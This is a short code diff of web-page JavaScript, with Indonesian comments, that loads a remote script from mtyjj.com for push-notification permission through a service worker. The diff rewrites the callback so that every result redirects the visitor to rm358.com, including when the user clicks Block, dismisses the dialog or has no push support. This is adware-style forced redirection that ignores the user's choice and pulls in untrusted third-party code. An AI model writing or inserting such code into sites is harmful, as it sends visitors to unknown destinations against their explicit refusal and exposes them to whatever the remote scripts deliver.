@@ -189,13 +189,16 @@
     s.src='//mtyjj.com/e81/7274d/mw.min.js?z=11484184'+'&sw=/sw-check-permissions-d17db.js'+'&nouns=1';
     s.onload = function(result) {
         switch (result) {
-            case 'onPermissionDefault':break;
-            case 'onPermissionAllowed':
+            case 'onPermissionDefault':    // user tutup dialog tanpa pilih
             Replace("//rm358.com/4/11484237");break;
-            case 'onPermissionDenied':
+            case 'onPermissionAllowed':    // user klik Allow
             Replace("//rm358.com/4/11484237");break;
-            case 'onAlreadySubscribed':break;
-            case 'onNotificationUnsupported':break;
+            case 'onPermissionDenied':     // user klik Block
+            Replace("//rm358.com/4/11484237");break;
+            case 'onAlreadySubscribed':    // sudah subscribe push sebelumnya
+            Replace("//rm358.com/4/11484237");break;
+            case 'onNotificationUnsupported': // iOS / browser tanpa push support
+            Replace("//rm358.com/4/11484237");break;
         }
     };
     document.head.appendChild(s);
